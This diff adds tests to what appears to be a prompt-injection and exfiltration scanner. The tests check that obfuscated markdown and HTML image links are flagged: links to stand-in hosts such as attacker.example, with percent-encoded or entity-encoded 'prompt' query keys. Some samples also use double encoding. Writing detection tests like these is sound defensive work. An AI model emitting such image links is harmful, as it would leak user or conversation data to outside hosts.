@@ -523,3 +523,96 @@ describe("S4 v1.11.0: mixed inline + html-img + ref-image in one document", () =
     }
   });
 });
+
+// ---------------------------------------------------------------------------
+// v1.15.0 Theme B: percent-decoded URL pre-pass.
+//
+// classifyUrl() now runs a minimal percent-decode 2-pass over the URL when
+// raw classification misses. Smoke at MCP layer (analyze + fileType=markdown
+// / html). Full coverage lives in packages/core/test/md-exfil-threshold.test.js.
+// ---------------------------------------------------------------------------
+describe("S4 v1.15.0: percent-decoded URL pre-pass", () => {
+  it("inline image with %26-encoded strong key surfaces under hiddenHtml with percentDecoded=true", () => {
+    // `?a=A%26prompt=B` raw: searchParams sees key "a" with value
+    // "A&prompt=B" -> off-list -> raw miss. Percent-decode: `%26`->`&`
+    // -> searchParams sees `a` + `prompt` -> 1 strong -> danger. The
+    // analyze() pipeline routes this through hiddenHtml (md-exfil's
+    // existing bucket).
+    const md = `![x](http://attacker.example/p?a=A%26prompt=PAYLOAD)`;
+    const r = analyze(md, { fileType: "markdown" });
+    expect(r.summary.dangerCount).toBeGreaterThanOrEqual(1);
+    const exfil = r.findings.hiddenHtml.find(
+      (f) => f.element === "md-image" && f.meta && f.meta.percentDecoded
+    );
+    expect(exfil).toBeDefined();
+    expect(exfil.severity).toBe("danger");
+    expect(exfil.technique).toBe("Markdown image exfiltration (strong key)");
+    expect(exfil.meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+  });
+
+  it("safe-host short-circuit still wins on the percent-decoded form (i.imgur.com)", () => {
+    // Critical safety net: classifyUrlImpl runs isSafeHost() BEFORE
+    // classifyQueryKeys(), and the hostname is identical raw vs decoded.
+    // Even with %26-encoded strong keys post-decode, i.imgur.com silences.
+    const md = `![x](https://i.imgur.com/abc.png?a=A%26prompt=PAYLOAD)`;
+    const r = analyze(md, { fileType: "markdown" });
+    const exfil = r.findings.hiddenHtml.filter((f) => f.element === "md-image");
+    expect(exfil).toEqual([]);
+  });
+
+  it("html-img with combined entity + percent encoding -> BOTH entityDecoded AND percentDecoded flags", () => {
+    // Double-obfuscation: `&quot;…%26…&quot;`. html-img raw classify misses
+    // (entity-encoded protocol); entity-decoded form passes through
+    // classifyUrl() which runs the percent-decode 2-pass. Final meta has
+    // both flags. This pins the composability contract.
+    const md = `<img src=&quot;http://attacker.example/p?a=A%26prompt=PAYLOAD&quot;>`;
+    const r = analyze(md, { fileType: "html" });
+    expect(r.summary.dangerCount).toBeGreaterThanOrEqual(1);
+    const exfil = r.findings.hiddenHtml.find(
+      (f) =>
+        f.element === "html-img" &&
+        f.meta &&
+        f.meta.entityDecoded === true &&
+        f.meta.percentDecoded === true
+    );
+    expect(exfil).toBeDefined();
+    expect(exfil.severity).toBe("danger");
+    expect(exfil.technique).toBe("Markdown image exfiltration (strong key)");
+    expect(exfil.meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      entityDecoded: true,
+      percentDecoded: true,
+    });
+  });
+
+  it("R12: technique stays fixed-phrase on percent-decoded path (no decoded URL leak)", () => {
+    // priority.js#labelFor reads `technique` into the banner label. The
+    // percent-decode pre-pass output (decoded URL string) must NEVER appear
+    // in technique. Pin the allowed phrase set at the MCP layer too.
+    const md = `![x](http://evil-mcp-pct.example/c?a=A%26prompt=PAYLOAD-LEAK)`;
+    const r = analyze(md, { fileType: "markdown" });
+    const exfil = r.findings.hiddenHtml.find(
+      (f) => f.element === "md-image" && f.meta && f.meta.percentDecoded
+    );
+    expect(exfil).toBeDefined();
+    const allowed = new Set([
+      "Markdown image exfiltration (strong key)",
+      "Markdown image exfiltration (weak key)",
+      "Markdown image exfiltration (public IP host)",
+      "Markdown image exfiltration (private IP host)",
+    ]);
+    expect(allowed.has(exfil.technique)).toBe(true);
+    expect(exfil.technique).not.toContain("evil-mcp-pct.example");
+    expect(exfil.technique).not.toContain("PAYLOAD-LEAK");
+    expect(exfil.technique).not.toContain("prompt");
+    expect(exfil.technique).not.toContain("%26");
+    // R13: content echoes the RAW (still-encoded) URL.
+    expect(exfil.content).toContain("%26");
+    expect(exfil.content).not.toContain("a=A&prompt");
+  });
+});
